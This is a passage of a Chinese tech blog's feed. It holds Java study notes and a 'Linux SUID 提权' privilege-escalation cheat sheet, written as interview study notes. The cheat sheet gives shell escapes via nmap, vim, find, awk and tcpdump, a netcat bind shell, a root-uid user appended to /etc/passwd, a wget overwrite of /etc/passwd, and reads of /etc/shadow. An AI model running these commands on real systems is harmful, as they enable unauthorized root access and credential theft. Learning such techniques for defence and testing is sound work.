id="5-1-1-阻止继承：final-类和方法"><a href="#5-1-1-阻止继承：final-类和方法" class="headerlink" title="5.1.1 阻止继承：final 类和方法"></a>5.1.1 阻止继承：final 类和方法</h4><p>阻止派生 Executive 类的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Executiv</span> <span class="keyword">extends</span> <span class="title">Manager</span></span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样设置方法为 final ，子类就不可以覆盖这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-1-2-抽象类"><a href="#5-1-2-抽象类" class="headerlink" title="5.1.2 抽象类"></a>5.1.2 抽象类</h4><p>抽象类声明抽象的方法，具体实现是在子类。抽象类方便方法调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> abstractClasses;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getDescription</span><span class="params">()</span></span>;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getDescription</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"a student majoring in "</span> + major;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-2-Object：所有类的超类"><a href="#5-2-Object：所有类的超类" class="headerlink" title="5.2 Object：所有类的超类"></a>5.2 Object：所有类的超类</h3><p>可以用 Object 类型变量引用任何类型的对象。具体操作时需要进行强制类型转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Employee(<span class="string">"Hacker"</span>, <span class="number">3500</span>);</span><br><span class="line">Employee e = (Employee)obj;</span><br></pre></td></tr></table></figure><p>只有基本类型不是对象，所有数组类型，包括基本类型的数组都拓展了 Object 类</p><h3 id="5-3-泛型数组列表"><a href="#5-3-泛型数组列表" class="headerlink" title="5.3 泛型数组列表"></a>5.3 泛型数组列表</h3><p>Java 中允许在运行中确定数组的大小，更简单的方法是使用  ArrayList 类，类似于数组，但在添加或删除元素的时候，能自动调整数组容量。</p><p>尖括号中类型参数不允许是基本类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Employee&gt; staff = <span class="keyword">new</span> ArrayList&lt;Employee&gt;();</span><br><span class="line"><span class="comment">//or</span></span><br><span class="line">ArrayList&lt;Employee&gt; staff = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="comment">//java10 可以使用 var</span></span><br><span class="line"><span class="keyword">var</span> staff = <span class="keyword">new</span> ArrayList&lt;Employee&gt;();</span><br><span class="line"></span><br><span class="line">staff.add(<span class="keyword">new</span> Employee(<span class="string">"Hacker"</span>,...));</span><br><span class="line">staff.set(i, harry);</span><br><span class="line">Employee e = staff.get(i);</span><br></pre></td></tr></table></figure><h3 id="5-4-反射"><a href="#5-4-反射" class="headerlink" title="5.4 反射"></a>5.4 反射</h3><p><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">https://javasec.org/javase/Reflection/Reflection.html</a></p><h2 id="6-接口、lambda-表达式与内部类"><a href="#6-接口、lambda-表达式与内部类" class="headerlink" title="6 接口、lambda 表达式与内部类"></a>6 接口、lambda 表达式与内部类</h2><h3 id="6-1-接口"><a href="#6-1-接口" class="headerlink" title="6.1 接口"></a>6.1 接口</h3><p>接口不是类，而是对希望符合这个接口的类的一组需求。</p><p>Comparable 接口代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Comparable</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(T other)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在接口中所有方法都自动是 public，不过在实现的时候，必须把方法声明为 public</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Employee</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Compares employees by salary</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> other another Employee object</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> a negative value if this employee has a lower salary than</span></span><br><span class="line"><span class="comment">    * otherObject, 0 if the salaries are the same, a positive value otherwise</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Employee other)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> Double.compare(salary, other.salary);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>为什么不把接口设计为抽象类呢？</strong></p><p>一个类智能继承一个类但能实现多个接口。</p><p>Java 设计者选择了不支持多重继承，因为其会让语言变得非常复杂或者降低效率。</p></blockquote><h3 id="6-2-lambda-表达式"><a href="#6-2-lambda-表达式" class="headerlink" title="6.2 lambda 表达式"></a>6.2 lambda 表达式</h3><p>Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> lambda;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.Timer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This program demonstrates the use of lambda expressions.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0 2015-05-12</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Cay Horstmann</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LambdaTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> planets = <span class="keyword">new</span> String[] &#123; <span class="string">"Mercury"</span>, <span class="string">"Venus"</span>, <span class="string">"Earth"</span>, <span class="string">"Mars"</span>, </span><br><span class="line">         <span class="string">"Jupiter"</span>, <span class="string">"Saturn"</span>, <span class="string">"Uranus"</span>, <span class="string">"Neptune"</span> &#125;;</span><br><span class="line">      System.out.println(Arrays.toString(planets));</span><br><span class="line">      System.out.println(<span class="string">"Sorted in dictionary order:"</span>);</span><br><span class="line">      Arrays.sort(planets);</span><br><span class="line">      System.out.println(Arrays.toString(planets));</span><br><span class="line">      System.out.println(<span class="string">"Sorted by length:"</span>);</span><br><span class="line">      Arrays.sort(planets, (first, second) -&gt; first.length() - second.length());</span><br><span class="line">      System.out.println(Arrays.toString(planets));</span><br><span class="line">            </span><br><span class="line">      <span class="keyword">var</span> timer = <span class="keyword">new</span> Timer(<span class="number">1000</span>, event -&gt;</span><br><span class="line">         System.out.println(<span class="string">"The time is "</span> + <span class="keyword">new</span> Date()));</span><br><span class="line">      timer.start();   </span><br><span class="line">         </span><br><span class="line">      <span class="comment">// keep program running until user selects "OK"</span></span><br><span class="line">      JOptionPane.showMessageDialog(<span class="keyword">null</span>, <span class="string">"Quit program?"</span>);</span><br><span class="line">      System.exit(<span class="number">0</span>);         </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-3-代理"><a href="#6-3-代理" class="headerlink" title="6.3 代理"></a>6.3 代理</h3><p>动态代理（Dynamic Proxy）的机制：可以在运行期动态创建给定接口的新类。</p><p><a href="https://javasec.org/javase/DynamicProxy/DynamicProxy.html" target="_blank" rel="noopener">https://javasec.org/javase/DynamicProxy/DynamicProxy.html</a></p><h2 id="7-异常处理"><a href="#7-异常处理" class="headerlink" title="7 异常处理"></a>7 异常处理</h2><p><a href="https://www.runoob.com/java/java-exceptions.html" target="_blank" rel="noopener">https://www.runoob.com/java/java-exceptions.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-Java-概述&quot;&gt;&lt;a href=&quot;#1-Java-概述&quot; class=&quot;headerlink&quot; title=&quot;1 Java 概述&quot;&gt;&lt;/a&gt;1 Java 概述&lt;/h2&gt;&lt;p&gt;2014 Java8&lt;/p&gt;
&lt;p&gt;2017 Java9&lt;/p&gt;
&lt;p&gt;Java11 LTS版&lt;/p&gt;
&lt;h2 id=&quot;2-Java-程序设计环境&quot;&gt;&lt;a href=&quot;#2-Java-程序设计环境&quot; class=&quot;headerlink&quot; title=&quot;2 Java 程序设计环境&quot;&gt;&lt;/a&gt;2 Java 程序设计环境&lt;/h2&gt;&lt;h3 id=&quot;2-1-Java-术语&quot;&gt;&lt;a href=&quot;#2-1-Java-术语&quot; class=&quot;headerlink&quot; title=&quot;2.1 Java 术语&quot;&gt;&lt;/a&gt;2.1 Java 术语&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;JDK: Java开发工具(包含JRE)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;JRE: Java运行环境&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Java SE (Standard Edition) 标准版本：用于桌面或者简单服务器应用的Java平台&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Java EE (Enterprise Edition) 企业版本：用于复杂服务器应用的Java平台&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Java ME (Micro Edition) 微型版本：用于小型设备的Java平台&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;NetBeans：Oracle公司的集成开发环境&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Linux SUID 提权</title>
    <link href="https://jlkl.github.io/2020/01/27/Web_15/"/>
    <id>https://jlkl.github.io/2020/01/27/Web_15/</id>
    <published>2020-01-27T08:59:01.000Z</published>
    <updated>2020-01-27T09:06:20.316Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>面试时发现关于 SUID 并不是很清楚，所以学习记录下</p><h2 id="0x01-关于-SUID"><a href="#0x01-关于-SUID" class="headerlink" title="0x01 关于 SUID"></a>0x01 关于 SUID</h2><p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</p><p>那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。</p><a id="more"></a><p>但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p><p>如 <code>passwd</code> 的权限：</p><p><img src="/2020/01/27/Web_15/20200127144036.png" alt></p><p>用户可以输入自己的密码或者不需要密码在root权限下执行命令，这可在设置文件 <code>/etc/sudoers</code> 中配置。</p><h3 id="1-1-etc-sudoers-语法"><a href="#1-1-etc-sudoers-语法" class="headerlink" title="1.1 /etc/sudoers 语法"></a>1.1 /etc/sudoers 语法</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure><p>root 用户可以从 ALL（任何）终端执行，充当ALL（任何）用户，并运行ALL（任何）命令。第一部分指定用户，第二部分指定可充当用户，第三部分指定 <code>sudo</code> 可运行的命令。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touhid <span class="keyword">ALL</span>= /sbin/poweroff</span><br></pre></td></tr></table></figure><p>输入 touchid 的密码，可以 sudo 执行 poweroff 命令。</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touhid ALL = (root) <span class="string">NOPASSWD:</span> <span class="regexp">/usr/</span>bin/find</span><br></pre></td></tr></table></figure><p>不输入密码,可以 sudo 执行 find 命令</p><h3 id="1-2-查找具有-SUID-权限位文件"><a href="#1-2-查找具有-SUID-权限位文件" class="headerlink" title="1.2 查找具有 SUID 权限位文件"></a>1.2 查找具有 SUID 权限位文件</h3><p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -user root -perm -4000 -<span class="builtin-name">print</span> 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"><span class="builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>也可以使用 <code>sudo -l</code> 命令列出当前用户可执行的命令</p><p><img src="/2020/01/27/Web_15/20200127151310.png" alt></p><h2 id="0x02-常用提权方式"><a href="#0x02-常用提权方式" class="headerlink" title="0x02 常用提权方式"></a>0x02 常用提权方式</h2><h3 id="2-1-nmap"><a href="#2-1-nmap" class="headerlink" title="2.1 nmap"></a>2.1 nmap</h3><p>nmap（2.02-5.21）存在交换模式，可利用提权</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure><p>之后执行:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !<span class="keyword">sh</span></span><br><span class="line"><span class="keyword">sh-3.2# </span>whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>msf中的模块为：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure><p>较新版可使用 <code>--script</code> 参数：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"os.execute('/bin/sh')"</span> &gt; /tmp/<span class="keyword">shell</span>.nse &amp;&amp; sudo <span class="keyword">nmap</span> --script=/tmp/<span class="keyword">shell</span>.nse</span><br></pre></td></tr></table></figure><p>kali nmap 7.7 提权成功：</p><p><img src="/2020/01/27/Web_15/20200127154030.png" alt></p><h3 id="2-2-find"><a href="#2-2-find" class="headerlink" title="2.2 find"></a>2.2 find</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="built_in">test</span></span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> whoami \;</span><br></pre></td></tr></table></figure><p>nc 反弹 shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> netcat -lvp 5555 -e /bin/sh \;</span><br></pre></td></tr></table></figure><h3 id="2-3-vi-vim"><a href="#2-3-vi-vim" class="headerlink" title="2.3 vi/vim"></a>2.3 vi/vim</h3><p>打开vim,按下ESC</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set <span class="keyword">shell</span><span class="bash">=/bin/sh</span></span><br><span class="line">:<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -<span class="keyword">c</span> '<span class="title">!sh</span>'</span><br></pre></td></tr></table></figure><h3 id="2-4-bash"><a href="#2-4-bash" class="headerlink" title="2.4 bash"></a>2.4 bash</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line"><span class="attribute">uid</span>=1002(service) <span class="attribute">gid</span>=1002(service) <span class="attribute">euid</span>=0(root) <span class="attribute">groups</span>=1002(service)</span><br></pre></td></tr></table></figure><h3 id="2-5-less"><a href="#2-5-less" class="headerlink" title="2.5 less"></a>2.5 less</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less <span class="regexp">/etc/</span>passwd</span><br><span class="line">!<span class="regexp">/bin/</span>sh</span><br></pre></td></tr></table></figure><h3 id="2-6-more"><a href="#2-6-more" class="headerlink" title="2.6 more"></a>2.6 more</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more <span class="meta-keyword">/home/</span>pelle/myfile</span><br><span class="line">!<span class="meta-keyword">/bin/</span>bash</span><br></pre></td></tr></table></figure><h3 id="2-7-cp"><a href="#2-7-cp" class="headerlink" title="2.7 cp"></a>2.7 cp</h3><p>覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">zabbix@</span>localhost ~]$ cat /etc/passwd &gt;passwd</span><br><span class="line"><span class="number">2.</span>[<span class="symbol">zabbix@</span>localhost ~]$ openssl passwd <span class="number">-1</span> -salt hack hack123</span><br><span class="line"><span class="number">3.</span>$<span class="number">1</span>$hack$WTn0dk2QjNeKfl.DHOUue0</span><br><span class="line"><span class="number">4.</span>[<span class="symbol">zabbix@</span>localhost ~]$ echo <span class="string">'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash'</span> &gt;&gt; passwd</span><br><span class="line"><span class="number">5.</span>[<span class="symbol">zabbix@</span>localhost ~]$ cp passwd /etc/passwd</span><br><span class="line"><span class="number">6.</span>[<span class="symbol">zabbix@</span>localhost ~]$ su - hack</span><br><span class="line"><span class="number">7.</span>Password:</span><br><span class="line"><span class="number">8.</span>[<span class="symbol">root@</span><span class="number">361</span>way ~]# id</span><br><span class="line"><span class="number">9.</span>uid=<span class="number">0</span>(hack) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">10.</span>[<span class="symbol">root@</span><span class="number">361</span>way ~]# cat /etc/passwd|tail <span class="number">-1</span></span><br><span class="line"><span class="number">11.</span>hack:$<span class="number">1</span>$hack$WTn0dk2QjNeKfl.DHOUue0:<span class="number">0</span>:<span class="number">0</span>::/root/:/bin/bash</span><br></pre></td></tr></table></figure><h3 id="2-8-mv"><a href="#2-8-mv" class="headerlink" title="2.8 mv"></a>2.8 mv</h3><p>覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p><h3 id="2-9-nano"><a href="#2-9-nano" class="headerlink" title="2.9 nano"></a>2.9 nano</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano  <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure><h3 id="2-10-awk"><a href="#2-10-awk" class="headerlink" title="2.10 awk"></a>2.10 awk</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk '<span class="keyword">BEGIN</span> &#123;<span class="keyword">system</span>(<span class="string">"/bin/sh"</span>)&#125;<span class="string">'</span></span><br></pre></td></tr></table></figure><h3 id="2-11-man"><a href="#2-11-man" class="headerlink" title="2.11 man"></a>2.11 man</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">man</span> <span class="string">passwd</span></span><br><span class="line"><span class="comment">!/bin/bash</span></span><br></pre></td></tr></table></figure><h3 id="2-12-wget"><a href="#2-12-wget" class="headerlink" title="2.12 wget"></a>2.12 wget</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.1</span>:<span class="number">8080</span><span class="regexp">/passwd -O /</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure><h3 id="2-13-apache"><a href="#2-13-apache" class="headerlink" title="2.13 apache"></a>2.13 apache</h3><p>仅可查看文件，不能弹 shell：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache2 -f <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure><h3 id="2-14-tcpdump"><a href="#2-14-tcpdump" class="headerlink" title="2.14 tcpdump"></a>2.14 tcpdump</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $<span class="string">'id\ncat /etc/shadow'</span> &gt; <span class="regexp">/tmp/</span>.test</span><br><span class="line">chmod +x <span class="regexp">/tmp/</span>.test</span><br><span class="line">sudo tcpdump -ln -i eth0 -w <span class="regexp">/dev/</span><span class="keyword">null</span> -W <span class="number">1</span> -G <span class="number">1</span> -z <span class="regexp">/tmp/</span>.test -Z root</span><br></pre></td></tr></table></figure><h3 id="2-15-python-perl-ruby-lua-php-etc"><a href="#2-15-python-perl-ruby-lua-php-etc" class="headerlink" title="2.15 python/perl/ruby/lua/php/etc"></a>2.15 python/perl/ruby/lua/php/etc</h3><p>python</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">"import os;os.system('/bin/bash')"</span></span><br></pre></td></tr></table></figure><p>perl</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="string">"/bin/bash"</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://touhidshaikh.com/blog/?p=790" target="_blank" rel="noopener">Abusing SUDO (Linux Privilege Escalation)</a></li><li><a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="noopener">【安全科普】Linux提权——利用可执行文件SUID</a></li><li><a href="https://www.jianshu.com/p/e6c4c4bdf7c3" target="_blank" rel="noopener">linux特殊权限SUID、SGID、SBIT</a></li><li><a href="http://101.200.63.12/index.php/archives/521/" target="_blank" rel="noopener">SUID 提权 - CoColi丶</a></li><li><a href="https://evi1cg.me/archives/SUID_Privilege_Escalation.html" target="_blank" rel="noopener">SUID Privilege Escalation - Evi1cg</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;面试时发现关于 SUID 并不是很清楚，所以学习记录下&lt;/p&gt;
&lt;h2 id=&quot;0x01-关于-SUID&quot;&gt;&lt;a href=&quot;#0x01-关于-SUID&quot; class=&quot;headerlink&quot; title=&quot;0x01 关于 SUID&quot;&gt;&lt;/a&gt;0x01 关于 SUID&lt;/h2&gt;&lt;p&gt;SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。&lt;/p&gt;
&lt;p&gt;那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="Linux" scheme="https://jlkl.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>C语言经典例题整理</title>
    <link href="https://jlkl.github.io/2020/01/26/C_C++_02/"/>
    <id>https://jlkl.github.io/2020/01/26/C_C++_02/</id>
    <published>2020-01-26T06:57:57.000Z</published>
    <updated>2020-04-05T07:20:06.763Z</updated>
    
